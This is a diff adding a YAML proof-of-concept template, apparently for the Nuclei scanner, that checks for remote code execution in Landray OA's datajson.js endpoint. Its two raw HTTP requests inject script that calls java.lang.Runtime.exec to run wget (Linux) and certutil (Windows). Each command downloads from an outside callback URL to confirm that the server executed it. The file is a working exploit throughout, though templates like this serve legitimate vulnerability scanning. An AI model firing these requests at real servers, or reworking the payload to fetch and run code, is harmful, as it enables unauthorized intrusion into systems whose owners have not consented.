@@ -1,0 +1,31 @@
+id: poc-yaml-landray-oa-datajson-rce
+
+info:
+  name: poc-yaml-landray-oa-datajson-rce
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,rce,ct-483439
+  reference:
+    - https://www.cnsuc.net/thread-553.htm
+
+http:
+  - raw:
+      - |
+        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("wget -P /tmp/ {{reverseURL}}")&type=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("certutil -urlcache -split -f {{reverseURL}}")&type=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
